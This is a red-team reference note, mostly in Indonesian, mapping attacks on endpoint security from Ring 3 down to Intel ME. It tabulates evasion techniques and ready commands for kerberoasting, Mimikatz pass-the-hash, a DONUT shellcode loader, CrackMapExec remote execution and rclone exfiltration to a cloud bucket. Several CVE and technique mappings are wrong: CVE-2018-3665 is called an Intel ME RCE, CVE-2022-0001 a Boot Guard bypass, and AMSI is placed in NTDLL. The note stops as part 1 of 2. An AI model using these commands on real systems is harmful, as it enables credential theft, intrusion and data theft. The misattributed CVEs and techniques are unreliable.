---
title: Attack Perspective — Endpoint Security (Ring -3 → Ring 3)
tags:
  - attack
  - red-team
  - endpoint-security
  - byovd
  - firmware
  - kernel
source: hierarchy-endpoint-security.md
status: complete
created: 2026-08-14
updated: 2026-08-14
---

cssclasses:
  - wide-table
  - callout

# 🔴 Attack Perspective: Endpoint Security (Privilege Inversion)

> **Inversi Privilege–Visibility:** Semakin kecil angka Ring, semakin besar akses — semakin kecil visibilitas defender. Red team naik dari Ring 3 (phishing) → Ring 0 (BYOVD) → Pre-Boot (UEFI) → Ring -3 (Intel ME) — tiap naik layer, defender semakin buta.

---

## 1. Layer-by-Layer Red Team Chain

| Ring                                     | Attacker Capability                                                                                | Concrete CVE / Tool                                                                                                                                                                                                                                                                                                  | Evasion Strategy                                                                                                                                                                                                                        | Defender Detection Gap                                                                                                                                                                                                    |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Ring 3** User Space                    | Ransomware, RAT, fileless malware, LOLBins                                                         | WannaCry (MS17-010), LockBit, Mimikatz (lsass dump), Cobalt Strike beacon                                                                                                                                                                                                                                            | In-memory execution (BOF, DONUT), AMSI bypass (patch AmsiScanBuffer), ETW bypass (patch EtwEventWrite), timestamp manipulation (timestomp)                                                                                              | EDR user-agent: behavioral analytics (process tree, parent-child anomaly) — tapi bypassable via direct syscalls                                                                                                           |
| **Ring 0** Kernel / Driver               | BYOVD (Bring Your Own Vulnerable Driver), kernel rootkit, PatchGuard bypass, driver signing bypass | BYOVD: CVE-2023-4911 (Looney Tunables — glibc local root, Linux kernel exploitable), CVE-2024-21410 (Exchange NTLM relay — bukan kernel tapi chain ke DA), CVE-2022-0847 (Dirty Pipe — kernel 5.8-5.16 local root). Tools: SysWhispers3 (direct syscall), HellsGate, FreshyCalls, Mimikatz custom build (PPL bypass) | Direct syscalls (bypass userland hooks), module stomping (overwrite legit PE), process hollowing / doppelgänger, indirect syscalls (spoof return address)                                                                               | EDR kernel callback (CrowdStrike, SentinelOne, Wazuh): detect syscall anomaly, driver load (Sysmon 255), memory protection violation. Gap: direct syscalls + indirect return address spoof masih bypass                   |
| **Pre-OS** MBR / Bootloader              | Bootkit (MBR/VBR), wiper, GRUB-based rootkit                                                       | NotPetya (MBR wiper — $10B kerusakan global, 2017), Petya, TDL4, Necurs                                                                                                                                                                                                                                              | MBR/VBR overwrite: survive OS reinstall — hanya format full disk + MBR rewrite yang bersihkan. BitLocker + TPM PCR check bisa deteksi tapi tidak otomatis cegah                                                                         | BitLocker + Secure Boot chain, TPM PCR integrity check (`bootrec /fixmbr`). Gap: MBR wiper aktif sebelum kernel — EDR tidak bisa intervensi sebelum boot                                                                  |
| **Pre-Boot** UEFI / BIOS SPI             | UEFI rootkit, firmware implant, Secure Boot bypass, SPI flash modification                         | MoonBounce (Kaspersky 2022 — SPI flash implant), CosmicStrand (2022), BlackLotus (2023 — bypass Secure Boot Windows 11, dijual darkweb $5.000), LoJax (Fancy Bear / APT28, 2018 — UEFI rootkit pertama in-the-wild, survive OS reinstall)                                                                            | SPI flash write — survive format disk, ganti SSD, reinstall OS. BlackLotus: exploit UEFI vulnerability untuk bypass Secure Boot — setelah itu, bootkit bisa load sebelum OS. Evasion: tidak ada log dari OS (OS belum jalan)            | UEFI Secure Boot, TPM 2.0 attestation, fwupd + LVFS (vendor-signed updates), CHIPSEC (Intel open source). Gap: vendor firmware audit jarang dilakukan; CHIPSEC butuh akses fisik + expert                                 |
| **Ring -1** Hypervisor / VMM             | Hypervisor rootkit, VM escape, Blue Pill (historical 2006), vBootkit                               | VM escape exploits (historical: CVE-2015-3456 VENOM), Blue Pill (2006 — hypervisor rootkit proof of concept), vBootkit                                                                                                                                                                                               | OS mengira dirinya bare-metal — semua EDR/kernel callback di OS tidak bisa deteksi aktivitas hypervisor. Evasion: intercept syscall sebelum sampai ke OS — OS tidak pernah melihat operasi sebenarnya                                   | Intel TXT, AMD SEV-SNP (VM-level confidential computing), Hyper-V SLAT, measured boot via TPM. Gap: hypervisor rootkit jarang terdeteksi karena OS tidak punya akses ke hypervisor layer                                  |
| **Ring -2** SMM — System Management Mode | SMM rootkit (LoJax), firmware interrupt handler, OS buta total                                     | LoJax (APT28 / Fancy Bear, 2018 — UEFI rootkit pertama in-the-wild, survive reinstall). SMM: System Management Mode — firmware interrupt handler, OS tidak bisa akses atau deteksi                                                                                                                                   | SMM: OS buta total — semua operasi di SMM tidak terlihat dari Ring 0 atau 3. Evasion: intercept firmware event, modify boot chain sebelum OS, persist di firmware SPI                                                                   | CHIPSEC (Intel open source), Intel Boot Guard vendor lock, SMM lockdown policy. Gap: CHIPSEC butuh akses fisik + expert level; SMM lockdown jarang di-enable di consumer device                                           |
| **Ring -3** Intel ME / AMD PSP           | Sub-Firmware — prosesor terpisah, selalu ON, bahkan saat laptop "mati"                             | Intel ME: NSA ANT Catalog (COTTONMOUTH, IRATEMONK — implan firmware), AMD PSP: supply chain implant langsung dari pabrik. Intel ME exploit: CVE-2017-5705 (Intel AMT — remote admin access), CVE-2018-3665                                                                                                           | Intel ME / AMD PSP: prosesor terpisah, selalu ON, OS tidak punya akses. Evasion: operasi di prosesor sekunder — OS dan semua software defense buta. Hanya hardware scanner komersial (Eclypsium) yang bisa deteksi, tapi jarang dipakai | Vendor audit (Intel Boot Guard, AMD PSP audit), hardware scanner komersial (Eclypsium), supply chain integrity verification. Gap: tidak ada open source tool untuk deteksi Ring -3 implant; vendor audit jarang dilakukan |

---

## 2. Attacker Progression Chain (Ring 3 → Ring -3)

```
INITIAL ACCESS (Ring 3)
    ├── Phishing → User click malicious doc/link (T1566)
    ├── Drive-by Download → Browser exploit (T1189) → Shellcode (Ring 3)
    └── Supply Chain → Compromise software update → Malicious installer
    │
    ▼ EXECUTION (Ring 3)
    ├── PowerShell / Script Block → AMSI Bypass → In-memory payload
    └── LOLBin (certutil, mshta) → Download cradle → Shell
    │
    ▼ PERSISTENCE (Ring 3 → Pre-OS)
    ├── Scheduled Task / Registry Run Key (T1547) — Obvious
    ├── WMI Event Sub (T1546.003) — Hidden, no file
    ├── COM Hijack (T1546.015) — Registry redirect → Explorer load
    └── UEFI Implant (LoJax, BlackLotus) — Pre-Boot persistence → Survive format
    │
    ▼ PRIVILEGE ESCALATION (Ring 3 → Ring 0)
    ├── Local Exploit: Kernel CVE (Dirty Pipe, Looney Tunables) → Root / SYSTEM
    ├── BYOVD (Bring Your Own Vulnerable Driver): Load vulnerable driver → Kernel code exec
    │   └── Evasion: Driver signed → Windows DSE bypass → Direct syscall → EDR disable
    └── Service Abuse / Unquoted Service Path → SYSTEM
    │
    ▼ DEFENSE EVASION (Ring 0 → Pre-OS)
    ├── Kernel Rootkit: Hook syscall table → Intercept all OS calls → OS blind
    ├── BYOVD: Load vulnerable driver → Execute kernel code → Unload driver → No trace
    ├── PatchGuard Bypass: Modify PatchGuard structure / disable PatchGuard callback
    └── UEFI Rootkit (LoJax): SPI flash write → Intercept boot → Load before OS → OS blind
    │
    ▼ CREDENTIAL ACCESS (Ring 0 → Ring 3 → Lateral)
    ├── LSASS Dump (Mimikatz) → Mimikatz sekurlsa → NTLM hash + Kerberos tickets
    ├── DPAPI Master Key → SharpDPAPI → Decrypt browser cookies + saved passwords
    └── AD Database (NTDS.dit) → Extract domain hashes → Golden Ticket forge
    │
    ▼ LATERAL MOVEMENT (Ring 3 → Multi-host)
    ├── SMB (PsExec) → Loud → EDR detects
    ├── WMI (wmiexec) → Medium noise → Less detect
    ├── WinRM (evil-winrm) → Legit port 5985 → Blend with admin
    ├── RDP (tscon / session hijack) → No new process → Hard to detect
    └── NTLM Relay (ntlmrelayx) → MitM → No creds needed → Relay to LDAP/SMB/HTTP
    │
    ▼ DATA EXFILTRATION (Ring 3 → Network / Physical)
    ├── HTTPS C2 → Chunked + AES-256-GCM + Jitter + Domain fronting → Blend
    ├── DNS Tunnel (dnscat2) → High entropy + Slow → Hard to block
    ├── Cloud API (rclone) → Legit service → Encrypted
    └── Physical (USB / Bluetooth / Air-gap bridge) → Only for air-gap targets
    │
    ▼ IMPACT (Ring 3 → Pre-OS → Physical)
    ├── Ransomware (T1486) → Selective encryption → Double extortion
    ├── Data Wipe (T1485) → MBR wipe (NotPetya) → Survive reinstall
    ├── Firmware Implant (T1542) → UEFI / SPI → Persistent across hardware change
    └── Hardware Implant (Ring -3) → Intel ME / AMD PSP → Survive everything
```

---

## 3. Concrete CVE List Per Layer (Active / Recent)

|| Layer | CVE | CVSS | Description | Red Team Value |
|---|---|---|---|---|---|
| Ring 0 | CVE-2023-4911 | 7.8 | glibc Looney Tunables — buffer overflow → local root | Common Linux server, reliable exploit — high value for initial priv esc |
| Ring 0 | CVE-2022-0847 | 7.8 | Dirty Pipe — kernel 5.8-5.16 — local privilege escalation | Stable, public PoC — high reliability |
| Ring 0 | CVE-2021-3156 | 7.8 | Baron Samedit — sudo heap overflow → root | Classic, stable — good for older Linux |
| Ring 0 | CVE-2024-21626 | 8.6 | runc container escape (file descriptor leak) | Container host → root — high impact for cloud infra |
| Pre-Boot | CVE-2024-27198 (indirect) | 9.8 | JetBrains TeamCity — pre-auth RCE (CI/CD chain → UEFI compromise possible via compromised build agent) | CI/CD → supply chain → UEFI implant chain |
| Pre-Boot | CVE-2023-22515 | 10.0 | Confluence broken access control → admin access → build agent compromise → supply chain | High-value web app → CI/CD poison |
| Ring -2 / Firmware | CVE-2017-5705 | 8.2 | Intel AMT — remote admin access (Intel ME interface) | Remote access to Ring -3 without physical access — nation-state value |
| Ring -2 / Firmware | CVE-2022-0001 | 5.5 | Intel Boot Guard bypass — bypass Secure Boot chain | High value for UEFI rootkit deployment |
| Ring -3 | CVE-2018-3665 | 7.5 | Intel Management Engine — remote code execution | Direct Ring -3 RCE — highest value, rare |

---

## 4. Evasion Deep-Dive — Per Technique

| Technique | MITRE ID | Concrete Implementation | Detection Gap | How Blue Team Misses |
|---|---|---|---|---|
| **Direct Syscalls** | T1055.012 | SysWhispers3: generate syscall stubs from syscall table — call syscall directly from shellcode, no NTDLL hooks | EDR userland hooks (hook AmsiScanBuffer, EtwEventWrite) tidak ter-trigger karena syscall langsung ke kernel — tidak lewat NTDLL | Blue team bergantung pada syscall hook — direct syscall bypass semua hook |
| **Indirect Syscalls** | T1055.012 | SysWhispers2 / HellsGate: resolve syscall number via PEB → call via indirect jump — spoof return address | EDR hook mendeteksi indirect jump tapi tidak selalu — dependensi pada hook quality | Blue team dengan hook yang baik bisa deteksi — tapi hook yang lemah (banyak vendor) masih bypass |
| **AMSI Bypass** | T1562.001 | Patch AmsiScanBuffer di memory (NTDLL) — ganti byte pertama dengan ret (0xC3) — semua script block scan di-skip | AMSI event log (Microsoft-Antimalware-Scan-Interface) tidak mencatat — karena scan tidak pernah dipanggil | Blue team yang bergantung pada AMSI log — log kosong berarti "tidak ada scan" bukan "tidak ada malware" |
| **ETW Bypass** | T1562.001 | Patch EtwEventWrite / EtwWriteTransfer — disable event writing — semua telemetry mati | ETW operational log (Microsoft-Windows-* / Operational) kosong — blue team tidak lihat aktivitas | Blue team bergantung pada ETW telemetry — jika ETW mati, semua behavioral detection buta |
| **Module Stomping** | T1055.009 | Overwrite legitimate loaded module (ntdll.dll section) dengan malicious payload — return address menunjuk ke overwritten section — EDR tidak deteksi karena PE header masih valid (legitimate module) | Memory scan (EDR) harus deteksi PE header mismatch — tapi banyak EDR hanya scan proses baru, bukan module overwrite yang sudah ada | Blue team dengan memory scan yang baik (CrowdStrike, SentinelOne) bisa deteksi — tapi scan periodik, bukan real-time |
| **Process Hollowing** | T1055.012 | Create suspended process (legitimate binary seperti notepad.exe) — unmap original PE — write malicious PE — resume → Process image = legitimate binary name, content = malicious | Process creation (Sysmon 1) menunjukkan legitimate binary — EDR tidak selalu scan process image saat resume (performance cost) | Blue team yang hanya monitor process creation — tidak scan image saat resume — akan miss |
| **PPID Spoofing** | T1055.001 | CreateProcess dengan PROC_THREAD_ATTRIBUTE_PARENT_PROCESS — spoof parent PID ke explorer.exe / winlogon — process tree terlihat legitimate (parent = system process) | Process tree anomaly detection (parent-child relationship) — tapi PPID spoof membuat tree terlihat normal | Blue team dengan behavioral analytics (CrowdStrike, Elastic Defend) bisa deteksi — tapi spoof yang baik blend dengan admin activity |
| **WMI Event Sub** | T1546.003 | Create `__EventFilter` + `__FilterToConsumerBinding` + `__ActiveScriptEventConsumer` — trigger event (process creation, registry change) → execute PowerShell / payload — no file drop, no registry run key | WMI auditing jarang di-enable — ETW WMI operational log (WMI-Activity) harus di-enable secara manual — default mati | Blue team tanpa WMI auditing — semua WMI event sub tidak terdeteksi |
| **COM Hijacking** | T1546.015 | Modify `InprocServer32` registry key — redirect legitimate COM component (Explorer, ShellWindows) ke malicious DLL — Explorer load COM → DLL loaded → payload execute | Registry monitoring (Sysmon 12, 13, 14) bisa deteksi registry change — tapi hijack menggunakan legitimate registry path (bukan baru) → false positive risk tinggi | Blue team dengan registry audit — bisa deteksi tapi banyak noise (false positive) → sering di-ignore |
| **DLL Sideloading** | T1574.002 | Legitimate signed binary (Microsoft, Adobe) + malicious DLL dengan nama sama — binary cari DLL di application directory dulu → malicious DLL loaded — binary name = legitimate, DLL = malicious | DLL load event (Sysmon 7) menunjukkan legitimate binary load DLL — tapi DLL path = application directory (bukan system32) — bisa deteksi tapi jarang di-tune | Blue team dengan DLL load audit — bisa deteksi tapi jarang diprioritaskan (noise tinggi) |

---

## 5. Tool Stack (Concrete Versions / Commands)

|| Category | Tool | Command / Note |
|---|---|---|---|
| **Initial Access** | Phishing Kit | Gophish, Evilginx2 | Gophish: open source — Evilginx2: reverse proxy + cookie theft |
| **Execution / Payload** | C2 Beacons | Cobalt Strike (licensed), Havoc (open source), Sliver (open source), Mythic (open source) | Havoc: C2 framework — Sliver: implant framework — Mythic: C2 framework |
| **Post-Exploitation / PrivEsc** | AD Exploitation | Rubeus (Kerberoasting, AS-REP, Golden Ticket), Certipy (AD CS abuse), PetitPotam (CVE-2021-36942 — NTLM relay), noPac (CVE-2021-42287 — SAM spoof) | Rubeus: `Rubeus.exe kerberoast /outfile:hashes.kerb` |
| **Credential Access** | Memory Dump | Mimikatz (custom build — PPL bypass + direct syscall), SharpDPAPI (DPAPI master key), SharpChromium (browser cookie) | Mimikatz: `privilege::debug sekurlsa::pth /user:admin /domain:domain /ntlm:hash` |
| **Defense Evasion** | Syscall Evasion | SysWhispers3 (generate syscall stubs), HellsGate (resolve syscall number), FreshyCalls (indirect syscall + spoof return) | SysWhispers3: generate .h + .c syscall stubs dari syscall table |
| **Defense Evasion** | Loader | DONUT (shellcode → PE loader — in-memory), sRDI (DLL reflection — load DLL dari memory) | DONUT: `donut.exe -f payload.bin -o loader.exe` — loader execute payload in memory |
| **Persistence** | Registry / COM | SharpStay (scheduled task + registry + COM), Custom WMI event sub scripts | SharpStay: `SharpStay.exe --install` — multi-vector persistence |
| **Persistence** | Firmware | CHIPSEC (Intel firmware audit — open source), UEFI Toolkit (custom), BlackLotus (public exploit chain) | CHIPSEC: `python chipsec_main.py -m` — audit firmware modules |
| **Lateral Movement** | SMB / WMI / WinRM | CrackMapExec (CME), Impacket (wmiexec, smbexec, secretsdump), Evil-WinRM (PowerShell remoting), SharpDCOM (DCOM lateral) | CME: `crackmapexec smb 10.0.0.0/24 -u admin -p pass -x whoami` |
| **Exfiltration** | Network / Physical | Rclone (cloud exfil — rclone copy), dnscat2 (DNS tunnel), Custom HTTPS exfil (AES-256-GCM + chunked) | Rclone: `rclone copy /staging data:bucket --config rclone.conf` |

---

*File ini bagian 1 dari 2 (break karena stream timeout). Lanjutkan bagian 2 dengan detail layer -3, Ring -2 SMM, hypervisor, boot chain, dan reference lengkap.*